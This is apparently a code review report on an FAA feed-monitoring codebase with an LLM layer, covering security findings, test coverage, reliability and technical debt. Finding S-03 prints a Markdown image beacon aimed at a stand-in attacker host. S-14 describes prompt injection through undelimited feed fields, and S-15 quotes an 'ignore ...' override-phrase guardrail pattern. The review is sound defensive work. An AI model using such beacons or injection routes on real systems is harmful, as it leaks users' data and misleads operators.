# Code review: sentinelfaa

| | |
|---|---|
| **Reviewed** | `main` at `f249c13` (2026-09-30), whole codebase, not a diff |
| **Effort** | max: three phases, five independent reviewers, every high-impact claim re-read or reproduced |
| **Scope** | `nas-feedops-sentinel/` (app), `instraclustr/` (gateway, Vault, SPIRE), `.github/`, scripts. The vendored `reference/` directory (36 files) is excluded |
| **Changes code?** | No. This is a report. Nothing in the tree was modified |

**How to read this.** Each level is complete on its own; go deeper only if you need to.

| Level | Time | Where |
|---|---|---|
| **0** | 1 min | [Scorecard and verdict](#level-0-scorecard-and-verdict) |
| **1** | 5 min | [Ranked findings](#level-1-ranked-findings) (one table, 50 rows) |
| **2** | 30 min | [Analysis by area](#level-2-analysis-by-area): quality, security (with OWASP Top 10), testing, reliability, AI layer, technical debt |
| **3** | reference | [Evidence and method](#level-3-evidence-and-method): tool output, reproduction commands, verification log, limits |

**The three phases**

1. **Discovery.** Inventory, git history, then measurement with tools (radon, bandit, vulture, ruff, pip-audit, a secrets scan of the tree and all history, a duplication scan, an AST smell scan, Docker and compose checks, and the full test suite under branch coverage).
2. **Deep analysis.** Five read-only reviewers, one per risk area (application security, dashboard XSS and authorization, reliability and data integrity, the AI layer and governance, infrastructure and supply chain). Then verification: I re-read the cited code for the highest-impact claims and reproduced two by running them.
3. **Report.** This file. Every finding carries a verdict: **CONFIRMED** (I re-read the code and can name the trigger and the wrong outcome) or **PLAUSIBLE** (the mechanism is real but the trigger depends on deployment or attacker position, or the reviewer quoted the evidence and I did not re-read it).

---

## Level 0: scorecard and verdict

| Dimension | Grade | One line |
|---|---|---|
| **Code quality** | **B** | 90% of functions are simple, duplication is 0.8%, 95% are fully typed. Two files are near-unmaintainable by index and eleven functions exceed complexity 30 |
| **Security** | **B−** | No critical or high finding and no live secret. The strong controls are real. The gaps are dashboard authorization coverage, one fail-open sign-in path, and hardening of the local stack |
| **Testing** | **B+** | 957 tests pass. `src/` is at 91.8% line and 83.0% branch coverage. The dashboard is at 74.6% and 50.3%. End-to-end coverage is thin |
| **Reliability** | **C+** | The ingest path has no retention and writes one row at a time. Both are High. The disk hit 97% during this review |
| **Technical debt (SQALE)** | **B** | Debt ratio **5.15%** (about 374 hours, 47 person-days) against a 7,258-hour development cost. Just over the A line. At 10 min/line instead of the 30 min/line convention it would be 15.5% (C) |

**Verdict.** The codebase is well above the norm for a project of this age (141 commits in 24 days). The safety-critical design is sound and was checked hard: decisions are authorized server-side, the audit tables cannot be altered, SQL is parameterized everywhere, XML parsing is hardened, dependencies are hash-locked and clean. The problems are the edges around that core: what an unauthenticated or under-privileged dashboard user can trigger, what happens when the feed runs for weeks, and two logic bugs in the Watch Officer brief that shipped today.

**Fix first (about 40 hours, in this order)**

1. **R-01 and R-02: retention and batched writes.** The feed never stops and nothing prunes archived files or event rows. Disk exhaustion halts the Java edge and with it the feed.
2. **S-01 and S-02: fail closed and role-gate.** The dashboard has been public since PR 15. A missing `secrets.toml` silently turns sign-in into a free-text callsign, and the Overview page lets any signed-in account run paid model calls and write rows.
3. **W-01 and W-02: Watch Officer brief.** In a degraded picture the brief hides a genuine critical alert, and a stored "ALL CLEAR" stays on screen after the feed dies. Both are in code merged today.
4. **S-04: server-assigned event ids.** `/v1/ingest` lets the caller pick the primary key, and the upsert rewrites every column.
5. **I-01 and I-05: key-file permissions and edge rate limits.**

**Checked and clean** (so you do not need to re-check them): no eval/exec/subprocess/pickle/`yaml.load` in production code; every SQL statement is parameterized (11 bandit hits are constant column lists); all XML goes through defusedxml with DTDs forbidden; 0 bare `except`, 0 TODO/FIXME, 0 `type: ignore`; runtime dependencies have 0 known vulnerabilities (106 packages); no secret or key file is tracked and none appears in history.

---

## Level 1: ranked findings

45 findings (2 High, 22 Medium, 21 Low) plus 5 rows that are modelled as debt (complexity and coverage) rather than estimated one by one. **Effort** is a stated estimate in hours. **V** is the verdict: **C** = confirmed, **P** = plausible. Details for High and Medium items are in Level 2.

| ID | Sev | V | Finding | Where | Effort |
|---|---|---|---|---|---|
| R-01 | High | C | No retention for archived files, failed files or event rows | `src/swim_file_ingest.py:1777` | 8 |
| R-02 | High | C | Events and alerts are written one row per round trip | `src/storage/repositories/events_repo.py:111` | 6 |
| S-01 | Med | C | Sign-in fails open when `secrets.toml` is absent | `dashboard/lib/login.py:71` | 2 |
| S-02 | Med | C | Overview page runs paid LLM calls and DB writes with no role check | `dashboard/app.py:344,350,391` | 4 |
| S-03 | Med | C | Model and stored text rendered as raw Markdown (link and image beacons) | `dashboard/app.py:417,445` | 3 |
| S-04 | Med | C | `/v1/ingest` lets the caller choose `event_id`; the upsert rewrites every column including `data_origin`; retries duplicate | `events_repo.py:45`, `api.py:337` | 5 |
| S-05 | Med | P | Roles and guest expiry are not re-checked with Keycloak for up to 10 h | `dashboard/lib/login.py:147` | 8 |
| S-13 | Med | C | Redaction misses callsigns and unquoted keys; `redacted=True` is hard-coded so the policy rule can never fire | `src/redaction.py:47`, `src/llm_client.py:273` | 6 |
| S-14 | Med | P | No untrusted-data delimiting in any prompt; grounding checks ids, not support | `src/critic_agent.py:31`, `src/investigation/specialists.py:85` | 8 |
| S-16 | Med | P | Any signed-in user can drive unlimited model spend; the Critic is re-called on every retry | `dashboard/app.py:343`, `src/pipeline.py:85` | 6 |
| I-01 | Med | C | Key material readable by a second local group through an inherited ACL | `nas-feedops-sentinel/tls/`, `instraclustr/vault-init-data/` | 1 |
| I-02 | Med | C | spire-agent has the Docker socket and the host PID namespace | `instraclustr/docker-compose.yml:331,340` | 4 |
| I-03 | Med | P | One flat network, no container hardening except cloudflared, plaintext east-west traffic | `nas-feedops-sentinel/docker-compose.yml` | 16 |
| I-04 | Med | P | Secrets in container environment outside the Vault plane | `docker-compose.yml:205,292,341` | 12 |
| I-05 | Med | C | Edge has no rate or connection limits; 256 worker connections shared by public and admin listeners | `docker/edge/nginx.conf:23` | 4 |
| I-06 | Med | P | Local CA has no name constraints, an unencrypted key and a 10-year life | `src/devcert.py:38` | 3 |
| I-07 | Med | C | Mutable image tags on the edge, Keycloak and base image; no update automation | compose files, `docker/Dockerfile:3` | 4 |
| I-13 | Med | C | SPIRE agent does not survive host sleep and has no restart policy | `instraclustr/docker-compose.yml:329` | 6 |
| R-03 | Med | P | No index leads with `received_time_utc`; several reads are unbounded | `src/storage/schema.py:408` | 4 |
| R-04 | Med | P | Claim recovery is defeated by a reused mtime; the janitor deletes recovered files | `src/swim_file_ingest.py:1731,1754` | 6 |
| R-05 | Med | P | One out-of-range value stalls a whole 500-file pass forever | `src/pipeline.py:59` | 5 |
| R-06 | Med | C | Quadratic origin lookup in the alert engine; the loop watchdog can kill the worker | `src/alert_engine.py:51` | 1 |
| W-01 | Med | C | A degraded data picture hides a genuine current CRITICAL | `src/watch_officer_assessment.py:233` | 1.5 |
| W-02 | Med | C | A stored "ALL CLEAR" brief is never recomputed when the feed dies | `dashboard/app.py:344` | 3 |
| S-06 | Low | P | Placeholder `API_KEY=change-me` is accepted | `.env.example:28`, `src/api.py:90` | 1 |
| S-07 | Low | C | Unbounded `label` becomes an unbounded Prometheus label | `src/api.py:133`, `src/pipeline.py:52` | 0.5 |
| S-08 | Low | C | An ungated ticket writer is still exported | `src/storage/__init__.py:107,428` | 0.5 |
| S-09 | Low | P | CSV formula injection in the audit export | `dashboard/pages/3_AI_Critic_and_Review.py:486` | 1 |
| S-10 | Low | P | Exception text and internal addresses shown to signed-in users | `dashboard/pages/5_Ingest_and_Replay.py:110` | 2 |
| S-11 | Low | P | Destructive ingest actions are not attributed to a person | `src/maintenance.py:53` | 2 |
| S-12 | Low | P | Latent unescaped URL sinks in the theme helpers | `dashboard/lib/theme.py:160,477,610` | 1.5 |
| S-15 | Low | P | Planner question is unbounded; the input guardrail is unwired and its regex is quadratic | `dashboard/app.py:391`, `src/guardrails.py:33` | 3 |
| S-17 | Low | C | The gateway fallback chain reaches `claude-model`, an alias the app policy never lists | `instraclustr/litellm-config.yaml:82` | 1 |
| I-08 | Low | C | CI actions pinned by tag; unpinned installs; no history secret scan | `.github/workflows/*.yml` | 3 |
| I-09 | Low | P | The vendor JAR is run without a checksum | `jumpstart/run-live.ps1:145` | 1 |
| I-10 | Low | P | Secrets on argv inside short-lived containers | `instraclustr/scripts/*.sh` | 2 |
| I-11 | Low | C | `.pem`, `.key`, `.env.local`, `*.tfvars` are not git-ignored; dead `docker/.dockerignore` | `.gitignore` | 1.5 |
| I-12 | Low | C | Dev dependency pytest 8.4.2 has PYSEC-2026-1845 (fixed in 9.0.3) | `requirements-dev.lock` | 0.5 |
| R-07 | Low | P | The watcher exits on a database error during a scan | `src/swim_file_ingest.py:1605` | 2 |
| R-08 | Low | P | Eight small correctness items (see Level 2) | various | 5 |
| W-03 | Low | P | The RVR artifact test searches free text, so a runway string can spoof it | `watch_officer_assessment.py:52,101` | 1 |
| W-04 | Low | P | Model headline is never compared to the status; overreach filter ignores negation | `watch_officer_assessment.py:363,56` | 3 |
| W-05 | Low | P | Taxi-tool router misroutes several phrasings | `src/surface_tools.py:55,111` | 2 |
| W-06 | Low | P | A cancelled LLM call leaves no audit row; empty replies are retried three times | `src/llm_client.py:295,412` | 2 |
| T-03 | Low | P | No browser-level end-to-end test, no property or mutation tests | `tests/` | 10 |
| Q-01 | debt | C | `evaluation.py`: `aggregate` complexity 115, another 86, maintainability index 0.0 | `src/evaluation.py:528,320` | model |
| Q-02 | debt | C | `swim_file_ingest.py`: 1,830 lines, maintainability index 1.0 | `src/swim_file_ingest.py` | model |
| Q-03 | debt | C | Six functions of complexity 30 to 37 in the investigation package | `src/investigation/` | model |
| Q-04 | debt | C | New code from this week adds hotspots (complexity 32, 28, 22; nesting 7) | see Level 2.1 | model |
| T-01 | debt | C | Dashboard branch coverage 50.3%; three files under 40% line coverage | see Level 2.3 | model |

---

## Level 2: analysis by area

### 2.1 Code quality

**Size.** 14,516 lines of production Python (src 10,699, dashboard 3,482, scripts 335) and 8,209 lines of tests, in 372 tracked files. Also 1,877 lines of PowerShell, 2,432 of shell, 821 of Java, 306 of Terraform and 3,950 of YAML.

**Complexity (radon, 818 functions and methods)**

| Measure | Value |
|---|---|
| Mean / median / p90 / max cyclomatic complexity | 4.57 / 2 / 10 / 115 |
| Rank A / B / C / D / E / F | 636 / 101 / 59 / 12 / 8 / 2 |
| Share at complexity 10 or less | 90.1% |
| Maintainability index: A / B / C (90 files) | 87 / 1 / 2, mean 62.4 |

Hotspots, worst first:

| Complexity | Where | Note |
|---|---|---|
| 115, 86, 37 | `src/evaluation.py:528, 320, 251` | Maintainability index 0.0. Three functions carry most of a 702-line module |
| 37, 31 | `src/investigation/evidence.py:127, 230` | |
| 37, 31, 31, 30, 22, 21 | `src/investigation/specialists.py` | Index 9.3 |
| 37 | `scripts/e2e_proof.py:82` | A script, lower stakes |
| 32 | `src/watch_officer_projection.py:109` | **New this week** |
| 28, 22 | `src/watch_officer_assessment.py:188, 108` | **New this week** |
| 24, 24 | `src/swim_file_ingest.py:814, 989` | File is 1,830 lines, index 1.0 |

Two notes on honesty. First, the Watch Officer hotspots are mine, written this week; they are rules engines, so branching is inherent, but `project_for_model` and `assess` should be split by concern. Second, `Settings` in `config.py` is a 411-line class of complexity 6: long but flat, so it is not a smell.

**Duplication.** A window scan for identical runs of six or more non-trivial lines found **0.8%** of production code duplicated (114 of 13,755 lines), almost all of it repeated method signatures in `llm_client.py`. Tests: 2.0%. This is very low.

**Smells (AST scan of production code, 732 functions)**

| Signal | Value | Read |
|---|---|---|
| Return type annotated / parameters fully annotated | 94.7% / 95.1% | Excellent |
| Public functions with a docstring | 52.1% | 349 undocumented. Low priority, real cost for a new reader |
| Functions with more than five parameters | 21 | Mostly builders and factories |
| Functions nested five or more levels deep | 6 | `surface_metrics.flight_timeline` is 7 (mine) |
| Exception handlers / broad `except Exception` / bare | 103 / 45 / 0 | 37 of the 50 `noqa` are `BLE001` and each carries a reason. I sampled eight "silent" handlers: every one returns the reason or degrades on purpose |
| `except: pass` | 3 | `async_bridge.py:65`, `swim_file_ingest.py:1038, 1802`. Cleanup paths |
| `print` calls | 34 | CLI scripts and `main.py` |
| eval / exec / subprocess / pickle / `yaml.load` | 0 | |
| Naive `datetime.now()` / `utcnow()` | 0 | The timestamp audit holds |
| TODO / FIXME / `type: ignore` | 0 / 0 | |

**Static analysis.** The repository's own ruff configuration passes clean. A broad isolated sweep (many rule families, repo config ignored) reports 511 items; the largest classes are style or intent, not defects: UP017 76 (`datetime.UTC` alias), E402 64 (deliberate path bootstrapping), SLF001 48 (the dashboard imports `theme._esc` across modules, one rename fixes 48), T201 34 (CLI prints), S311 32 (sample-data RNG), PLR0913 21, C901 17. Vulture reports one 100% hit (`file_secret_settings`, a pydantic-settings hook argument, a false positive) and 58 at 60%, mostly FastAPI routes and framework entry points.

### 2.2 Security

**What was tested:** secrets (tree and history), OWASP Top 10 (2021), dependency vulnerabilities, container and CI hardening, the LLM attack surface.

**Secrets.** 369 tracked text files and all 142 commits on every branch were scanned with 12 rules (cloud, Anthropic, OpenAI-style, Google, GitHub, Slack, Vault, JWT, private-key blocks, URLs with passwords, generic assignments). Ten hits in the tree, nine unique in history, **all triaged as non-secrets**: seven `os.environ/...` references in `litellm-config.yaml`, one `REPLACE_WITH_...` placeholder in `secrets.toml.example`, one psql variable (`PASSWORD :'owner_pw'`) in `deploy-smoke.sh`, and one obviously fake key in `tests/test_governance.py:18`. No `.env`, key, certificate or state file is tracked, and `.env` is ignored. Limits: regex rules only, no entropy scan, and I did not open any `.env` or `secrets.toml`. See I-11 for ignore-rule gaps.

**Dependencies.** Runtime lock: 106 packages, **0 known vulnerabilities**. Dev lock: 113 packages, **1**: pytest 8.4.2, PYSEC-2026-1845, fixed in 9.0.3 (a local `/tmp` directory issue on UNIX; CI and developer machines only) (I-12). Both locks are hash-pinned (2,504 and 2,653 hashes) and the image installs with `--no-index`. Bandit found 48 items and 0 High; all were triaged (Level 3).

**OWASP Top 10 (2021) mapping**

| Category | Result | Findings | What is sound |
|---|---|---|---|
| A01 Broken access control | **Gaps** | S-02, S-04, S-08 | Decisions call `authorize()` server-side with a row lock; roles come from token claims filtered to a known set; the UI's disabled buttons are backed by server checks |
| A02 Cryptographic failures | **Gaps** | I-01, I-04, I-06, I-10, S-13 | SPIFFE X.509 mTLS between services; Vault cert auth; name-constrained workload CA; TLS-only Vault listener |
| A03 Injection | **Mostly sound** | S-03, S-09, S-12, S-14 | All SQL is `$n`-parameterized. All 60 `unsafe_allow_html` sites escape data. No XSS was found |
| A04 Insecure design | **Gaps** | S-02, S-16, R-01 | Human-in-the-loop gate: staging depends only on severity, the model changes wording only |
| A05 Misconfiguration | **Gaps** | S-01, S-06, S-10, I-02, I-03, I-05, I-11 | Loopback-only host ports; public listeners expose only the dashboard and sign-in paths; non-root container |
| A06 Vulnerable components | **Mostly sound** | I-07, I-12 | Runtime deps clean; hash-locked; Trivy and pip-audit block in CI |
| A07 Authentication failures | **Gaps** | S-01, S-05, S-06 | Keycloak: brute-force lockout, PKCE S256, 12-character policy, registration off, no direct grants |
| A08 Integrity failures | **Gaps** | S-04, I-08, I-09 | Hash-locked installs; digest pins on several images; `pull_request_target` not used |
| A09 Logging and monitoring | **Mostly sound** | S-11, W-06 | Append-only `action_audit_log`, `investigations` and `model_calls`: the app role has SELECT and INSERT only, and triggers block UPDATE and DELETE |
| A10 SSRF | **None found** | none | The only outbound URLs come from configuration, never from feed or request content |

**Medium findings in detail**

**S-01. Sign-in fails open when `secrets.toml` is absent** (`dashboard/lib/login.py:71`, `dashboard/lib/page_setup.py:80`). `if exc.__cause__ is None: # no secrets file: not configured` returns "not configured", `oidc_configured()` is then false, and the page falls back to a self-declared callsign. Every page renders to anyone who can reach the public tunnel. Decisions and ingest actions stay refused (`ALLOW_UNVERIFIED_DECISIONS` defaults to false), but alerts, the audit log and briefs are readable and S-02 becomes open to everyone. `secrets.toml` exists today (I confirmed the file is present, not its contents), so this is not exploitable now; it is one bad bind mount away. A malformed file already fails closed. **Fix:** a compose-set `REQUIRE_SIGN_IN=1` that makes a missing file render the error and stop.

**S-02. No role check on the Overview page** (`dashboard/app.py:344,350,355,391`). `bootstrap_page()` discards the principal. "Refresh brief", "Deterministic only" and the Planner "Ask" box run paid model calls and write to `watch_officer_briefs` and `planner_results` for any signed-in account, including one with no realm role or only `auditor`. The Review and Ingest pages do gate. **Fix:** the same `can_decide` check as page 5, a `max_chars` on the question, and a cooldown (see S-16).

**S-03. Raw Markdown from model and stored text** (`dashboard/app.py:417,445`; `pages/3_AI_Critic_and_Review.py:154,181,367`). `st.markdown(f"**{pr.answer}**")` and `st.markdown(brief.get("answer",""))` render model output that is built from feed fields and the free-text question. HTML is off but Markdown links and images are on, so injected text such as `![](https://attacker/x?d=...)` makes every viewer's browser make a request. The answer is stored and re-shown to other users. The Watch Officer brief itself is safe because it goes through `_esc`. **Fix:** render model text with `st.text`, or strip link and image syntax first; add `img-src 'self'` at the edge as defence in depth.

**S-04. Client-chosen `event_id` and an all-column upsert** (`events_repo.py:45`, `api.py:337`, `models.py:273`). `NASEvent.event_id` is an ordinary field. The server overwrites only `data_origin`. `save_event` is `ON CONFLICT (event_id) DO UPDATE SET` every column including `data_origin`. An API-key holder who posts an existing id overwrites the stored row and flips its origin to `api`; because the last-seen-by-feed query counts only `live`, this can make a healthy feed look stale. Live ids are `stable_id("swim", source_key, index)`, computable from a known message identity, which is why this is medium and not high. The same field explains a retry problem (reviewer finding REL-B-4): payloads without an id get a new random uuid on every Temporal attempt, so a failure after `save_events` re-inserts the batch, and a duplicate workflow id is not handled (`api.py:360` catches only `RPCError`). **Fix:** for API and replay events derive `stable_id("api", idempotency_key, index)` server-side and drop any client id; make the upsert `DO NOTHING` or restrict it to the same origin.

**S-05. Session authority lags Keycloak** (`dashboard/lib/login.py:147`, `src/keycloak_auth.py:75`). Roles and the guest expiry are read from the ID token in the Streamlit cookie. Nothing calls Keycloak after sign-in, so a disabled user or removed role keeps their authority, up to supervisor override, for up to `auth_time + 36000 s` (10 h). **Fix:** re-check enabled state and roles every few minutes, or shorten the session; at minimum document the lag.

**S-13. Redaction gaps** (`src/redaction.py:47-92`, `src/llm_client.py:273`). I ran the redactor: `"When did UAL1234 push back at IAD?"`, `"callsign: AAL123 taxied"` and `"aircraft_id: AAL123"` come back **unchanged**, as does lowercase `n123ab`; `N123AB` is redacted. `flight_id`, `acid`, `gufi` are not in the sensitive-field list, and JSON-in-JSON and XML forms leak. Separately, `redacted=True` is hard-coded, so the policy rule at `policies/model-use.yaml:44-48` can never fire. Callsigns are public broadcast data, so the harm is a mismatch between what the Planner prompt tells the model ("flight ids are withheld") and what happens, plus a dead control. **Fix:** add a callsign-shape pattern (the one already at `surface_tools.py:47`), the missing keys, and a case-insensitive N-number; compute `redacted` from the actual result.

**S-14. Prompt injection has no structural defence** (`critic_agent.py:31`, `planner_agent.py:89`, `watch_officer_projection.py:66`, `execution_gate.py:226`, `specialists.py:85`). Alert descriptions (which embed the free-text runway), `feed_status`, `event_id` and the operator question reach prompts, and no prompt marks them as data. Model text is stored verbatim and later fed back to other prompts. Blast radius is text only, because staging depends solely on `severity == "CRITICAL"`. Two weak points: `ground()` checks that cited ids exist, not that the statement is supported; `accept_model_bluf` never compares the model's headline to the status, so "No issues, all normal" is accepted under a RED status. **Fix:** delimit and label untrusted fields in every prompt, cap free-text length at ingest, reject "no issue" language when `current_critical > 0`.

**S-16. Unbounded model spend** (`dashboard/app.py:343-394`, `src/pipeline.py:85-93`, `src/temporal_workflows.py:44-61`). Any signed-in principal can trigger unlimited calls. All roles share one gateway key (30 rpm, $10 per 30 days), so a viewer can push the Critic into its rules fallback. The Critic is re-called for every CRITICAL alert on every pass and on each of up to five Temporal attempts; dedup is only within a pass. Impact is bounded by the gateway cap. **Fix:** role check, a cooldown, skip the Critic when the condition already has a pending review, enforce cost before sending.

**Low security items** (detail in the register above): S-06 placeholder API key accepted (nothing rejects `change-me`); S-07 unbounded `label` makes a new time series per request in the worker; S-08 `save_operational_ticket` is exported with no gate or audit and no callers (the module comment says such writers were removed); S-09 audit CSV export does not neutralise leading `= + - @`; S-10 raw exception text, DB host and Kit folder path shown to any signed-in user, and Streamlit `showErrorDetails` left at default; S-11 "Clean Kit log now" deletes unprocessed messages with no actor recorded; S-12 `theme.py` interpolates `href` values without URL-encoding (no attacker path today); S-15 the input guardrail is not wired to the Planner and its `ignore\s+(\w+\s+)*...` pattern took 14.7 s on 70 KB (as measured by the reviewer); S-17 the gateway falls back `primary-model → gemini-backup → claude-model`, and `claude-model` is not on the app policy's allow-list (which checks the alias the app asks for, not the one that serves it) and the Gemini free tier is in the chain.

### 2.3 Testing

**Suite.** 983 tests collected (705 test functions, more once parametrized) and run against a throwaway Postgres 16: **957 passed, 8 skipped, 18 xfailed, 4 warnings in 322 s.** The 8 skips are all the Java writer tests, which need a JDK and the kit jar that the Python image does not have. The xfails are strict markers on known upstream bugs in Agent Governance Toolkit 3.7.0 (`tests/test_agt_known_bugs.py`): they turn red if upstream fixes the bug. 58 test files, 1,607 assertions, 2.28 per test.

**Coverage (`pytest --cov=src --cov=dashboard --cov-branch`)**

| Area | Statements | Line | Branch | Combined |
|---|---|---|---|---|
| `src/` | 6,563 | 91.8% | 83.0% | **89.9%** (CI floor: 84%) |
| `dashboard/` | 1,216 | 74.6% | 50.3% | 69.6% |
| All | 7,779 | 89.1% | 78.1% | 86.8% |

34 of 85 files are at 95% or better; no file is at 0%. Lowest, with 40 or more statements:

| File | Line coverage | Missing |
|---|---|---|
| `dashboard/lib/investigation_view.py` | 22.6% | 45 |
| `src/temporal_worker.py` | 33.0% | 58 |
| `dashboard/lib/agent_eval.py` | 37.0% | 43 |
| `dashboard/lib/data.py` | 54.0% | 39 |
| `src/main.py` | 56.8% | 30 |
| `dashboard/pages/5_Ingest_and_Replay.py` | 68.6% | 29 |
| `src/storage/migrate.py` | 70.6% | 13 |

The pattern is that well-tested logic sits under thin, less-tested entry points. Several of the Level 1 findings (S-01, S-02, W-02, the dashboard render paths) live in exactly the files with the lowest branch coverage.

**Testing trophy.** Classifying test functions by what they need (a heuristic on file content, see Level 3):

| Layer | Tests | Share | Read |
|---|---|---|---|
| Static (outside pytest) | n/a | n/a | Strong: ruff (clean), Semgrep with project rules, pip-audit, Trivy, all blocking in CI. Plus 22 in-suite contract tests that read policy and compose files |
| Unit | 339 | 48.1% | Pure functions: rules, redaction, metrics, parsing |
| Integration | 312 | 44.3% | Real Postgres, ASGI client, repositories. This is the trophy's fat middle and it is well filled |
| End to end | 32 | 4.5% | `test_e2e_proof.py`, Streamlit app tests, plus the deploy smoke script in CI |

The shape is close to a trophy: strong static base, integration roughly level with unit, thin top. What is missing is a browser-level test of the public dashboard (T-03), property-based tests for the parsers (the ingest module is the largest and most attacked input surface), and any mutation testing to check that the 2.28 assertions per test actually bite.

### 2.4 Reliability and data integrity

These findings matter because the feed runs continuously and the local disk was at 97% during this review.

**R-01 (High). No retention.** The only pruning is the ingest-log table (`ingest_log_repo.py:29 MAX_ROWS = 200_000`). `_archive_to_processed` (`swim_file_ingest.py:1777`) moves every ingested file into `data/processed/` and every rejected one into `data/failed/`, forever. I searched the source, scripts, compose and docs: nothing deletes from either directory, and nothing deletes from or partitions `nas_events` or `alert_events`. The janitor (`maintenance.py`) only cleans the Kit source folder. At the rate the feed can run, disk or inode exhaustion makes the Java edge halt the JVM (`IngestFolderFileOutput.java:163`) and the feed stops. **Fix:** age-based prune of `processed/` and `failed/`; daily partitions on `nas_events` and drop old ones.

**R-02 (High). Row-at-a-time writes.** `save_events` is `for event in events: await self.save_event(event)` and each call is an autocommit `pool.execute` (`events_repo.py:111`); `save_alerts` is the same. A pass of up to 500 files is one round trip per event (about 8 ms each per the repository's own docstring), so throughput tops out near 100 to 150 events per second while bursts can exceed that, and a mid-batch failure leaves a stored prefix. The code is confirmed; the rate is inferred. **Fix:** chunked `executemany` or an `unnest` upsert in one transaction.

**Medium.**

- **R-03.** No index leads with `received_time_utc`, yet `ORDER BY received_time_utc DESC LIMIT n` runs from `/ready`, the Feed Health page and `dashboard/lib/data.py`. `get_latest_rvr` and the latency and validation aggregates scan all history when `since` is none. **Fix:** a btree or BRIN on `received_time_utc`, and time-bound the aggregates.
- **R-04.** `os.utime(claimed)` at `swim_file_ingest.py:1754` and a 600 s claim timeout (`:1731`), against a 5-minute janitor. After a pipeline failure longer than 600 s the released files keep an old mtime, are deferred behind the newest-first cap, and are deleted by the janitor as "dropped unprocessed". Re-scans also use the claim-time mtime as receipt time, which inflates `latency_ms`. The comment at `temporal_activities.py:52-54` is wrong. **Fix:** keep the original mtime, track claim age separately, align janitor age with the claim timeout.
- **R-05.** Any out-of-int32 altitude, speed or vertical-speed value, or a NUL in a text field, makes asyncpg reject the whole batch (`pipeline.py:59`). The scan catches it, logs it and leaves the files claimed (`swim_file_ingest.py:1609-1612`), and about every 10 minutes up to 500 files cycle again, never quarantined. Unlikely on FAA data, total impact when it happens. **Fix:** on batch failure fall back to per-file storage and quarantine the offender; add range checks.
- **R-06.** `alert_engine.py:51` looks up each alert's origin with a linear scan of all events: O(alerts × events), synchronously inside the async pipeline. A replay of old captures, or clock skew that makes every event exceed 30 s latency, can block the loop until the worker's watchdog calls `os._exit(1)` after 60 s (`temporal_worker.py:97-103`). **Fix:** build an `event_id → origin` dict once. One line.

**Low (R-07, R-08).** The watcher exits on a database error during a scan (`swim_file_ingest.py:1605,1613`; compose restarts it, but a failure at `:1487` or `:1704` strands claimed files for 10 minutes). R-08 groups: the headers-only fallback turns TRACON `PCT` into `KPCT`, which `NASEvent` rejects, so a truncated message is quarantined with a misleading reason; replayed captures are ingested as `live` by default and the upsert can refresh `last_seen` and mask a stale feed; zero-event single-shot runs never commit their scan; one bad TAIS track quarantines the whole message (`:1076`); native-inotify watch mode drains only 500 files per 300 s once new files stop; a fresh database gets a duplicate foreign key (`schema.py:294`); a pool leaks if `init_schema` raises (`pool.py:61`); the airport gauge never decays.

**I-13 (Medium, operational).** The SPIRE agent attests with a single-use join token and has no restart policy. When the laptop slept, its SVID expired and the identity plane stayed down until `instraclustr/scripts/spire-first-boot.ps1` re-bootstrapped it. This happened during this review and blocked the deploy until fixed. **Fix:** an attestation method that survives restarts (or an automated re-issue on start) and a restart policy.

### 2.5 AI layer and Watch Officer

**Sound.** Only `llm_client.py` imports the model library (ruff rule TID251 enforces it). Policy loading fails closed on a missing, malformed or allow-by-default policy. The Watch Officer's status, counts, actions and confidence come from rules; the model writes only the headline, and its confidence is ignored. Staging is purely `severity == CRITICAL`, so no model output can create or suppress a review. The gateway key is limited to two aliases, $10 per 30 days and 30 requests per minute. Dashboard HTML views escape model text.

**Watch Officer bugs (all in code merged this week; W-01 and W-02 are the important two).**

- **W-01.** In `_status_and_bluf` the `DEGRADED` branch sets `AMBER` and a headline that is only `health.reason`. `current_critical` is never consulted there (`watch_officer_assessment.py:233-237`). If one airport's feed is stale and a genuine CRITICAL low RVR fired minutes ago at another, the brief says `AMBER | DATA PICTURE: DEGRADED` with no mention of the critical, while the same alert with healthy feeds gives RED. **Fix:** in `DEGRADED`, if a current CRITICAL sits at a non-degraded airport, go RED and put the count in the headline.
- **W-02.** A brief is regenerated only when none is stored, when a button is clicked, or at CRITICAL staging (`dashboard/app.py:344`). If the feed dies after a GREEN brief, stale-feed alerts are WARNING and do not re-stage, so the dashboard keeps showing "ALL CLEAR — data is current" with only a generated-at timestamp (`brief_view.py:44`). Rule 2 ("check our own pipeline first") never runs. **Fix:** recompute the deterministic assessment on every load and flag any brief older than the down threshold.
- **W-03.** `_ARTIFACT_RVR = \b0 ft\b` is searched over the whole description, which embeds the free-text runway (`alert_engine.py:141-145`). A runway string containing `0 ft` turns a real CRITICAL into "history on an RVR 0 ft sensor code" and GREEN. Needs control of the runway text (API key or file). **Fix:** derive the flag from the numeric RVR.
- **W-04.** The overreach filter is negation-blind: it discards "not used by controllers" and "no ATC impact", which are exactly the statements the prompt asks for, and passes "controllers may be affected". The output injection check rejects an honest critique that quotes attack text.
- **W-05.** Taxi router: "still taxiing in the departure queue" matches taxi-in and suppresses the queue tool; "haven’t taken off" (curly apostrophe) selects no tool and sets no `not_fetched` marker; "last 1.5 hours" and "last 2 days" silently become 15 minutes; `int()` on more than 4,300 digits raises. No ReDoS: 320 KB ran in 0.14 s.
- **W-06.** `except Exception` in the LLM client misses `CancelledError`, so a billed call cut by a Temporal timeout leaves no `model_calls` row. Empty content (the `finish_reason=length` case) is retried three times at temperature 0, each billed. `PLANNER_MODEL` is never used.

### 2.6 Technical debt (SQALE)

**Method.** SQALE expresses debt as remediation cost divided by the cost to develop the code from scratch. Development cost uses SonarQube's convention of 30 minutes per line of code. Remediation cost is the sum of stated estimates (Level 1 hours) plus three modelled items. The rating bands are A up to 5%, B up to 10%, C up to 20%, D up to 50%, E above.

| Input | Value | Basis |
|---|---|---|
| Production code lines | 14,516 | src + dashboard + scripts, excluding blanks, comments and docstrings |
| Development cost | 7,258 h | 14,516 × 30 min |
| Complexity remediation | 155.2 h | 12 h per function of complexity 50+ (2), 6 h for 30–49 (9), 3 h for 21–29 (11), 0.75 h for 11–20 (59) |
| Coverage remediation | 7.5 h | 149 statements to bring every file of 40+ statements and under 80% up to 80%, at 3 min each |
| Documentation | 29.1 h | 349 undocumented public functions × 5 min |
| Lint | 10 h | 4 h for the auto-fixable classes, 6 h for the manual ones |
| Findings register | 172.0 h | the 45 rows with an effort in Level 1 |

| SQALE characteristic | Hours |
|---|---|
| Maintainability: complexity | 155.2 |
| Security | 98.0 |
| Maintainability: documentation and lint | 39.1 |
| Reliability | 38.5 |
| Testability | 17.4 |
| Operability | 14.5 |
| Efficiency | 11.0 |
